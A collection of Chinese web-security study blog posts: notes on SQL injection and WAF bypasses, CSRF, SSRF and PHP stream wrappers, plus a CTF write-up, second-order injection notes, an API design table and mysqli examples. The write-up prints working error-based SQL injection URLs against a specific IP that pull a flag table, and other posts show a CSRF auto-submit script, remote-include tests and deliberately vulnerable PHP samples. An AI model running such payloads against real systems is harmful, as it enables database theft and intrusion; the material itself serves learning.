<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>分类</p>
<ul>
<li>报错注入<ul>
<li>常用xpath</li>
</ul>
</li>
<li>union<ul>
<li>常常过滤了<code>union</code>和<code>select</code></li>
</ul>
</li>
<li>盲注<ul>
<li>基于布尔(看页面变化)</li>
<li>基于时间(看响应时间)</li>
</ul>
</li>
<li>堆叠查询<ul>
<li>mysql+php比较少见</li>
</ul>
</li>
</ul>
<p>bypass WAF</p>
<ul>
<li><p>逗号</p>
<ul>
<li>limit =&gt; limit 1 offset 4</li>
<li>union =&gt; union select * from xxx join yyy</li>
<li>mid/substr =&gt; mid(user() from 1 for 1)</li>
</ul>
</li>
<li><p>空格</p>
<ul>
<li>注释</li>
<li>数字，科学计数法，小数点，运算符</li>
<li>NULL</li>
<li>圆括号，花括号，反引号</li>
</ul>
</li>
<li><p>单引号</p>
<ul>
<li>十六进制</li>
</ul>
</li>
<li><p>字段名</p>
<ul>
<li>select 1,2,3,4 union select * from vuln;</li>
</ul>
</li>
</ul>
<p>小trick</p>
<ul>
<li>反引号在能放置别名的地方做注释</li>
<li>select * from xxx into @a,@b,….临时变量出字段数代替order by</li>
<li>临时变量还有其他的用</li>
</ul>
<p>其他</p>
<ul>
<li>不开启<code>strict_all_table</code>,可能导致用户名超长截断</li>
<li>二次注入，过引号，逻辑上的回显</li>
<li>宽字节注入</li>
</ul>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>通过结束原来的命令来执行一条新的命令</p>
<h3 id="HTTP请求头注入"><a href="#HTTP请求头注入" class="headerlink" title="HTTP请求头注入"></a>HTTP请求头注入</h3><p>CR/LF攻击</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>php伪协议</p>
<ul>
<li>读源码</li>
<li>zip/phar小马</li>
</ul>
<p>一堆截断方式,%00,./这些在新版本里都不能用了</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>加入csrf_token<br>加入<code>Referer</code>的验证</p>
<p>CSRF一般是构造表单<br>然后自动提交<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">csrf_attack</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">'csrf_submit'</span>).click();</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="javascript"><span class="built_in">window</span>.onload = csrf_attack;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>在添加点样式啥的比如<code>display:none</code></p>
<h3 id="CSRF-和-XSS区别"><a href="#CSRF-和-XSS区别" class="headerlink" title="CSRF 和 XSS区别"></a>CSRF 和 XSS区别</h3><p>XSS漏洞通过xss代码获取受害者Cookie，之后通过设置Cookie可以冒充受害者，比如管理员<br>CSRF漏洞只受害者浏览了恶意网站相当于自己触动了操作</p>
<h3 id="CSRF结合XSS"><a href="#CSRF结合XSS" class="headerlink" title="CSRF结合XSS"></a>CSRF结合XSS</h3><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>bypass</p>
<ul>
<li>10进制，十六进制，8进制</li>
<li>限制了协议，用302跳转以支持gopher和其他协议</li>
<li>DNS rebinding</li>
<li>redis<ul>
<li>dict</li>
<li>gopher</li>
</ul>
</li>
</ul>
<h2 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h2><p>在登录前后应该换不同的cookie</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[一道题目]]></title>
      <url>/2017/07/17/%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/</url>
      <content type="html"><![CDATA[<p><a href="http://114.55.36.69:20680/" target="_blank" rel="external">http://114.55.36.69:20680/</a><br>做了n久做不出,也不知道题目是哪里来的</p>
<h2 id="咸鱼的我"><a href="#咸鱼的我" class="headerlink" title="咸鱼的我"></a>咸鱼的我</h2><p>过滤了<code>*</code>,<code>union</code>,<code>column</code><br>所以爆出来表名就不知所措了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news&amp;id=1 or(updatexml(1,concat(0x7e,(SELECT distinct group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1))</div><div class="line"></div><div class="line">=&gt; &apos;~error_flag,error_news~&apos;</div></pre></td></tr></table></figure>
<p>然后后感觉<code>id</code>这里过滤好严,试一试<code>table</code>那里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news`%23&amp;id=1</div></pre></td></tr></table></figure></p>
<p>这样子应该是把他截断了,所以显示是正常的<br>然后很笨的我尝试在后边加东西发现….<br>啊，怎么没用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news` where id =4 %23&amp;id=1</div></pre></td></tr></table></figure></p>
<p>我就是这么菜，就停在这里了</p>
<p>然后后来问了大佬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news`%23`where id =4 %23&amp;id=1 (%23是注释#)</div></pre></td></tr></table></figure>
<p>知道这样子就可以了</p>
<p>大概是先<code>desc</code>了table，然后table存在的情况下才进行查询,而且才知道<code>table</code>这里过滤不严</p>
<p>按照大佬说的大概是<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">desc `error_$&#123;table&#125;`;</div><div class="line"><span class="comment">-- table存在的话,再</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> error_$&#123;<span class="keyword">table</span>&#125; <span class="keyword">where</span> <span class="keyword">id</span> = $<span class="keyword">id</span>;</div></pre></td></tr></table></figure></p>
<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>问了下Bendawang师傅，果然。。。师傅做题就和切菜一样，几分钟丢回来一个答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=flag`%23` where 0=extractvalue(1,(select flag_you_will_never_know from error_flag))%23`&amp;id=1</div></pre></td></tr></table></figure></p>
<blockquote>
<p>他这个能够判断出有无table，只能是提前先执行了show COLUMNS 或是desc</p>
</blockquote>
<p>然后学习了QAQ<br>这个<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`#`....#</div></pre></td></tr></table></figure></p>
<blockquote>
<p>如果列名前缀有有一个`,那第一个`闭合了前面的`,然后第一个#就可以注释掉后面的<br>如果列名前缀没有`,那`#`就作为列名的别名，最后一个#起到注释作用</p>
</blockquote>
<pre><code>这里真的是学习了
</code></pre><h2 id="后来的后来"><a href="#后来的后来" class="headerlink" title="后来的后来"></a>后来的后来</h2><p>查到了一篇wp,但还是不知道这题目从哪里来的</p>
<p><a href="http://www.wupco.cn/?p=3764" target="_blank" rel="external">http://www.wupco.cn/?p=3764</a></p>
<p>然后果然就是Bendawang师傅说的那样…真是好强啊(我好菜啊…)</p>
<p>顺便收一下大佬<a href="http://www.wupco.cn/" target="_blank" rel="external">blog</a></p>
<p>然后突然发现在同一个ip还有一道题目 <a href="https://moe.sh/article/19" target="_blank" rel="external">https://moe.sh/article/19</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[allow_url_fopen]]></title>
      <url>/2017/07/17/allow-url-fopen/</url>
      <content type="html"><![CDATA[<p>在php里<br><code>allow_url_fopen</code>默认是开启<br><code>allow_url_include</code>默认是关闭的<br>而且他们只能在<code>php.ini</code>里设置,开始还用<code>ini_set</code>试了下果然不能改</p>
<h2 id="官网定义"><a href="#官网定义" class="headerlink" title="官网定义"></a>官网定义</h2><h3 id="allow-url-fopen"><a href="#allow-url-fopen" class="headerlink" title="allow_url_fopen"></a>allow_url_fopen</h3><blockquote>
<p>Whether to allow the treatment of URLs (like http:// or ftp://) as files</p>
</blockquote>
<h3 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h3><blockquote>
<p>This setting requires allow_url_fopen to be on. </p>
</blockquote>
<p>官网意思是要开启<code>allow_url_include</code>你也得开启<code>allow_url_fopen</code><br>特地试了一下关闭<code>allow_url_fopen</code>打开<code>allow_url_include</code><br>好吧,官网没骗我<br>后来发现，好像不全是，继续看</p>
<p>具体作用是</p>
<blockquote>
<p>Whether to allow include/require to open URLs (like http:// or ftp://) as files</p>
</blockquote>
<p>就是说开了这个可以让include, include_once, require 和 require_once也都能用url和伪协议</p>
<blockquote>
<p> 原来官网描述这么清楚了</p>
</blockquote>
<h2 id="其他情况"><a href="#其他情况" class="headerlink" title="其他情况"></a>其他情况</h2><p>但是呢<br>在官网上查<code>data://</code>的时候，会告诉你</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Supported</th>
</tr>
</thead>
<tbody>
<tr>
<td>Restricted by allow_url_fopen</td>
<td>No</td>
</tr>
<tr>
<td>Restricted by allow_url_include</td>
<td>Yes</td>
</tr>
<tr>
<td>———————–</td>
<td>————–</td>
</tr>
</tbody>
</table>
<p>他这是告诉我用<code>data://</code>只要开<code>allow_url_include</code>不需要<code>allow_url_fopen</code>???<br>实践一下<br>但我尝试了官网的例子，提示我<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">data:// wrapper is disabled in the server configuration by allow_url_fopen=0</div></pre></td></tr></table></figure></p>
<p>ヾ(｡｀Д´｡))，你骗我啊，还是要<code>allow_url_fopen</code>才能使用的呀好不好</p>
<h4 id="只用file-get-contents"><a href="#只用file-get-contents" class="headerlink" title="只用file_get_contents"></a>只用file_get_contents</h4><p>再试验一下<code>php://</code><br>先看<code>php://input</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    ini_set(<span class="string">'display_errors'</span>, <span class="string">'On'</span>);</div><div class="line">    <span class="keyword">echo</span> <span class="string">'allow_url_fopen: '</span>.ini_get(<span class="string">'allow_url_fopen'</span>).<span class="string">'&lt;br&gt;'</span>; <span class="comment">// 0</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">'allow_url_include: '</span>.ini_get(<span class="string">'allow_url_include'</span>).<span class="string">'&lt;br&gt;'</span>; <span class="comment">// 0</span></div><div class="line">    <span class="comment">// method 1</span></div><div class="line">    $fp = fopen(<span class="string">"php://input"</span>, <span class="string">"r"</span>);</div><div class="line">    <span class="keyword">echo</span> fread($fp, <span class="number">1024</span>);</div><div class="line">    <span class="comment">// method 2</span></div><div class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"php://input"</span>);</div></pre></td></tr></table></figure></p>
<p>这个<code>php://input</code>什么都不需要</p>
<p>再看下<code>php://filter</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    ini_set(<span class="string">'display_errors'</span>, <span class="string">'On'</span>);</div><div class="line">    <span class="keyword">echo</span> <span class="string">'allow_url_fopen: '</span>.ini_get(<span class="string">'allow_url_fopen'</span>).<span class="string">'&lt;br&gt;'</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'allow_url_include: '</span>.ini_get(<span class="string">'allow_url_include'</span>).<span class="string">'&lt;br&gt;'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/resource=http://www.baidu.com"</span>);</div></pre></td></tr></table></figure></p>
<p>要开<code>allow_url_fopen</code></p>
<h4 id="使用include"><a href="#使用include" class="headerlink" title="使用include"></a>使用include</h4><p>先都开一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    ini_set(<span class="string">'display_errors'</span>, <span class="string">'On'</span>);</div><div class="line">    <span class="keyword">echo</span> <span class="string">'allow_url_fopen: '</span>.ini_get(<span class="string">'allow_url_fopen'</span>).<span class="string">'&lt;br&gt;'</span>; <span class="comment">// 1</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">'allow_url_include: '</span>.ini_get(<span class="string">'allow_url_include'</span>).<span class="string">'&lt;br&gt;'</span>; <span class="comment">// 1</span></div><div class="line">    <span class="keyword">include</span> file_get_contents(<span class="string">"php://input"</span>);</div></pre></td></tr></table></figure></p>
<p>POST是<code>http://www.eval.com/include/1.txt</code></p>
<p>下来都关掉<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    ini_set(<span class="string">'display_errors'</span>, <span class="string">'On'</span>);</div><div class="line">    <span class="keyword">echo</span> <span class="string">'allow_url_fopen: '</span>.ini_get(<span class="string">'allow_url_fopen'</span>).<span class="string">'&lt;br&gt;'</span>; <span class="comment">// 0</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">'allow_url_include: '</span>.ini_get(<span class="string">'allow_url_include'</span>).<span class="string">'&lt;br&gt;'</span>; <span class="comment">// 0</span></div><div class="line">    $input = file_get_contents(<span class="string">"php://input"</span>);</div><div class="line">    <span class="keyword">echo</span> $input;</div><div class="line">    <span class="keyword">include</span> $input;</div></pre></td></tr></table></figure></p>
<p>POST是<code>http://www.eval.com/include/1.txt</code> 并不能<br>POST是<code>1.txt</code> 明显可以</p>
<h2 id="感觉自己中二病犯了"><a href="#感觉自己中二病犯了" class="headerlink" title="感觉自己中二病犯了"></a>感觉自己中二病犯了</h2><p>其实这些不都能想的到嘛<br>得出来一个结论好像是确实只要用到<code>allow_url_include</code>前提是你开了<code>allow_url_fopen</code></p>
<p>另外这个php伪协议并不等同于<code>url</code>,所以<code>php://input</code>没有也可以用,但你要<code>include</code>一个<code>php://input</code>的结果,这当然就要<code>allow_url_include</code>和<code>allow_url_fopen</code>了</p>
<p>但这个<code>data://</code>协议也需要<code>allow_url_fopen</code>的支持有些意外</p>
<p>其实就是<code>allow_url_include</code>是用来防护把远程的文件当做php代码执行的<br>而<code>allow_url_fopen</code>就是为了能让url当做文件来用</p>
<p>以前可能确实有一个误区就是url不能用的话,<code>php伪协议</code>也一定不能用，感觉他们好像是同类一样</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[二次注入]]></title>
      <url>/2017/07/17/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>续<code>sql注入从入门到入门</code><br>因为这个二次注入，听说过，也见师傅注过<br>但还是不太知道这个二次是个什么意思</p>
<h2 id="二次"><a href="#二次" class="headerlink" title="二次"></a>二次</h2><p>以前听到的都是关于引号的转义<br>大意是注册的时候,由于GPC或者其他，我们输入的payload里的单引号被转义了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?username=akak'</div></pre></td></tr></table></figure></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into user(uname) vaules ('akak\'');</div><div class="line">mysql&gt; select * from user;</div><div class="line"></div><div class="line">+<span class="comment">----+-----------+</span></div><div class="line">| id | uname     |</div><div class="line">+<span class="comment">----+-----------+</span></div><div class="line">|   1|akak'      |</div><div class="line">+<span class="comment">----+-----------+</span></div></pre></td></tr></table></figure>
<p>这个单引号就进去了，再取出来的时候，就引入了单引号<br>是不是说这里如果开了<code>magic_qutoes_runtime</code>就可以防止二次注入了???</p>
<p>所以这个二次指的就是第一次不会直接造成危害<br>再第二次用的时候实现了注入</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>上面就是正文哈哈哈哈<br>这次<code>某春秋全国大学生交换flag大赛</code>里有这样的一个题目叫 <code>flag bending machine</code><br>是一道二次注入,不过和单引号bypass没有什么关系</p>
<h2 id="刚刚"><a href="#刚刚" class="headerlink" title="刚刚"></a>刚刚</h2><p>就在刚刚准备找更多的一些资料，发现了一个ppt叫做<a href="http://read.pudn.com/downloads137/ebook/584779/web%B4%FA%C2%EB%B0%B2%C8%AB%B1%DF%D4%B5%D0%D4%CE%CA%CC%E2.ppt" target="_blank" rel="external">web代码安全边缘性问题</a></p>
<p>网名为<code>5up3rh3i</code>的大佬,拼写了一下，发现好像其实是传说级大佬黑哥<br>这个ppt里详细的说了一下<code>二次注入</code></p>
<p>感觉是一份神级资料<br>原来这个二次是<code>Second attack</code>,ahhhhh~</p>
<p>require一个文件存在错误的话，那么程序就会中断执行了，并显示致命错误<br>include一个文件存在错误的话，那么程序不会中端，而是继续执行，并显示一个警告错误</p>
<p>以下内容来自上面的ppt，我只是摘抄出来</p>
<p>二次攻击的特点</p>
<ul>
<li>常常存在漏洞类型的转换</li>
<li>常常存在变量中转</li>
</ul>
<p>类型1 文件系统函数漏洞转换<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span> </div><div class="line">    <span class="comment">// vul1.php</span></div><div class="line">    unlink($a);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?</span> </div><div class="line">    <span class="comment">//config.php</span></div><div class="line">    $include = <span class="string">'../'</span>;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?</span> </div><div class="line">    <span class="comment">//vul2.php</span></div><div class="line">    <span class="keyword">include</span> <span class="string">'$include/common.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>我们用<code>vul1.php</code>把<code>config.php</code>删掉,这样子在<code>register_globals=On</code>的情况下就能用<code>vul2.php</code>包含任意文件了</p>
<p>类型2 SQL注入漏洞转换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SQL注入 =&gt; Update/Insert =&gt; 数据库</div><div class="line">数据库 =&gt; Select =&gt; 其它函数</div></pre></td></tr></table></figure></p>
<p>这个漏洞在第二阶段取出来丢到其他函数的时候触发<br>举的例子就是先update了一波，但经过escape,防了一波SQL注入<br>但没有过滤<code>../</code>这些<br>后来又给select出来了丢到include里，这个时候利用了一波</p>
<p>类型3 preg_replace<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject)</div></pre></td></tr></table></figure></p>
<p>$subject 是要替换的母串<br>$pattern 是模式<br>$replacement 是要替换成的</p>
<p>第一个参数加了修饰符号<code>/e</code>的时候,第二个参数会被当做命令来执行<br>有些没看懂<br>另外<code>preg_replace</code>里存在%00截断(是不是现在已经被修复了???)</p>
<p>类型4 编码/解码<br>就是讲了<code>二次编码</code>造成的洞</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[API]]></title>
      <url>/2017/07/16/API/</url>
      <content type="html"><![CDATA[<h2 id="baseURI"><a href="#baseURI" class="headerlink" title="baseURI"></a>baseURI</h2><p>api.booksotre.com/v1/</p>
<h2 id="遵循"><a href="#遵循" class="headerlink" title="遵循"></a>遵循</h2><p>基本遵循restful API</p>
<h2 id="主要路由"><a href="#主要路由" class="headerlink" title="主要路由"></a>主要路由</h2><table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/index</td>
<td>首页</td>
</tr>
<tr>
<td>GET</td>
<td>/login</td>
<td>登录页面</td>
</tr>
<tr>
<td>GET</td>
<td>/logout</td>
<td>退出登录</td>
</tr>
<tr>
<td>GTE</td>
<td>/admin</td>
<td>书商管理</td>
</tr>
</tbody>
</table>
<h2 id="具体功能"><a href="#具体功能" class="headerlink" title="具体功能"></a>具体功能</h2><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><blockquote>
<p>登陆后更新session内容</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/login</td>
<td>null</td>
<td>显示登录界面</td>
</tr>
<tr>
<td>POST</td>
<td>/login</td>
<td>uname&amp;passwd</td>
<td>登录操作</td>
</tr>
</tbody>
</table>
<h2 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h2><blockquote>
<p>注销后清掉session</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>ALL</td>
<td>/logout</td>
<td>null</td>
<td>退出登录</td>
</tr>
</tbody>
</table>
<h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/regiter</td>
<td>null</td>
<td>显示注册界面</td>
</tr>
<tr>
<td>POST</td>
<td>/regiter</td>
<td>uname&amp;passwd</td>
<td>注册操作</td>
</tr>
</tbody>
</table>
<h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><blockquote>
<p>搜索功能，这里只涉及了书名搜索</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>/search</td>
<td>bname</td>
<td>搜索书籍</td>
</tr>
</tbody>
</table>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><blockquote>
<p>后台管理界面，具体后台管理内容还未完全设计出</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/admin</td>
<td>null</td>
<td>进入后台管理界面</td>
</tr>
</tbody>
</table>
<h2 id="订单相关"><a href="#订单相关" class="headerlink" title="订单相关"></a>订单相关</h2><blockquote>
<p>没有参数，是由session来决定用户</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/orders</td>
<td>null</td>
<td>查看所有订单</td>
</tr>
<tr>
<td>POST</td>
<td>/order</td>
<td>null</td>
<td>提交订单</td>
</tr>
<tr>
<td>DELETE</td>
<td>/order</td>
<td>null</td>
<td>删除订单</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/order/:id</td>
<td>id</td>
<td>查看订单详情</td>
</tr>
<tr>
<td>PUT</td>
<td>/order/:id</td>
<td>id</td>
<td>修改订单</td>
</tr>
</tbody>
</table>
<h2 id="书籍相关"><a href="#书籍相关" class="headerlink" title="书籍相关"></a>书籍相关</h2><table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/books/:typeId</td>
<td>typeId</td>
<td>查看某分类图书</td>
</tr>
<tr>
<td>POST</td>
<td>/bookType</td>
<td>null</td>
<td>返回书籍类型</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/book/:bookId</td>
<td>typeId</td>
<td>查看某分类图书</td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> 临时 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php里mysql, mysqli和pdo]]></title>
      <url>/2017/07/16/php%E9%87%8Cmysql-mysqli%E5%92%8Cpdo/</url>
      <content type="html"><![CDATA[<h2 id="远古的mysql"><a href="#远古的mysql" class="headerlink" title="远古的mysql"></a>远古的mysql</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql_connect($host, $user, $passwd);</div><div class="line">mysql_select_db($db_name);</div><div class="line">$result = mysql_query(<span class="string">"SELECT * FROM news where id = '$id'"</span>);</div><div class="line"><span class="keyword">if</span>(!$result) &#123;</div><div class="line">    <span class="comment">// error report</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个时候只能只过程化的写法,而且不能使用<code>bind column</code>,导致容易注入<br>然后出现了<code>mysql_escape_string()</code>和<code>mysql_real_escape_string()</code></p>
<h3 id="mysql-escape-string"><a href="#mysql-escape-string" class="headerlink" title="mysql_escape_string"></a>mysql_escape_string</h3><p>这里和另一个叫做<code>mysql_real_escape_string</code>是兄弟，唯一的区别real是根据当前字符集转义字符串</p>
<blockquote>
<p>从这个数据来源来说<br><code>magic_quotes_gpc</code>作用范围是<code>GET</code>,<code>POST</code>,<code>COOKIE</code><br><code>magic_quotes_runtime</code>作用范围是<code>数据库</code>或者文件中获得的数据<br><code>addslashes</code>,<code>mysql_[real_]escape_string</code>是对字符串作用</p>
<p>从作用范围来说<br><code>addslashes</code>和GPC和<code>magic_quotes_runtime</code>是对<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">['], ["], [\], NULL</div></pre></td></tr></table></figure></p>
</blockquote>
<p><code>mysql_[real_]escape_string</code>是针对<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">['], ["], [\], NULL</div><div class="line">[\n], [\r], [\x1a]</div></pre></td></tr></table></figure></p>
<h2 id="之后出现的mysqli"><a href="#之后出现的mysqli" class="headerlink" title="之后出现的mysqli"></a>之后出现的mysqli</h2><p>这个时候的<code>mysqli</code><br>既可以<a href="http://blog.csdn.net/koastal/article/details/50650496" target="_blank" rel="external">面向过程</a><br>又可以<a href="http://www.php.net/manual/zh/book.mysqli.php" target="_blank" rel="external">面向对象</a><br>所以既能看到这样子的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysqli_connect($host, $user, $passwd, $db);</div><div class="line">mysqli_query($db, $query);</div></pre></td></tr></table></figure></p>
<p>又有这样子的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$mysqli = <span class="keyword">new</span> mysqli($host, $user, $passwd, $db);</div><div class="line">$mysqli -&gt; query($sql);</div></pre></td></tr></table></figure></p>
<p>或者还有预编译的功能，先编译，然后绑定，执行(有面向对象和过程两种风格)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$mysqli = <span class="keyword">new</span> mysqli($host, $user, $passwd, $db);</div><div class="line">$stmt = $mysqli -&gt; prepare(<span class="string">"INSERT INTO test(id) VALUES (?)"</span>);</div><div class="line">$id = <span class="number">1</span>;</div><div class="line">$stmt -&gt; bind_param(<span class="string">"i"</span>, $id);</div><div class="line">$stmt -&gt; execute();</div><div class="line">$res = $stmt -&gt; get_result();</div></pre></td></tr></table></figure></p>
<p>这个参数绑定可以提高安全性的样子<br>这里的<code>bind_param($type, $arg1 [,$arg2...])</code>，<code>arg1</code>,<code>arg2</code>…对应的分别是第一个，第二个<code>?</code>,<code>$type</code>是参数类型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO CountryLanguage VALUES (?, ?, ?, ?)"</span>);</div><div class="line">$stmt-&gt;bind_param(<span class="string">'sssd'</span>, $code, $language, $official, $percent);</div></pre></td></tr></table></figure></p>
